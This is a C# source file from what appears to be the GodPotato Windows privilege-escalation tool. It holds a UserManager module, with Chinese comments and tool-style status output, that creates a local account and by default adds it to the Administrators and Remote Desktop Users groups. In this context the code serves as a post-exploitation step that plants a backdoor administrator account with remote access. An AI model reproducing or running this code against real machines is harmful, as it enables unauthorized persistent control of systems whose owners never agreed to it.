using System;
using System.IO;
using System.DirectoryServices;


namespace GodPotato
{
    public static class UserManager
    {
        public static void CreateLocalUserWithDirectoryEntry(
            TextWriter output,
            string username,
            string password,
            bool addToAdministrators = true,
            bool addToRemoteDesktopUsers = true)
        {
            try
            {
                // 连接到本地计算机
                using (DirectoryEntry localMachine = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer"))
                {
                    // 创建用户
                    DirectoryEntry newUser = localMachine.Children.Add(username, "user");
                    newUser.Invoke("SetPassword", new object[] { password });
                    newUser.CommitChanges();
                    output.WriteLine($"[*] 用户 {username} 创建成功");

                    // 添加到管理员组
                    if (addToAdministrators)
                    {
                        AddUserToGroup(localMachine, newUser, "Administrators", output);
                    }

                    // 添加到远程桌面用户组
                    if (addToRemoteDesktopUsers)
                    {
                        AddUserToGroup(localMachine, newUser, "Remote Desktop Users", output);
                    }
                }
            }
            catch (Exception ex)
            {
                output.WriteLine($"[!] 操作失败: {ex.Message}");
                throw;
            }
        }

        private static void AddUserToGroup(
            DirectoryEntry root,
            DirectoryEntry user,
            string groupName,
            TextWriter output)
        {
            try
            {
                DirectoryEntry group = root.Children.Find(groupName, "group");
                if (group != null)
                {
                    group.Invoke("Add", new object[] { user.Path });
                    output.WriteLine($"[+] 用户已添加到 {groupName} 组");
                }
                else
                {
                    output.WriteLine($"[!] 未找到 {groupName} 组");
                }
            }
            catch (Exception ex)
            {
                output.WriteLine($"[!] 添加到 {groupName} 组失败: {ex.Message}");
            }
        }
    }
}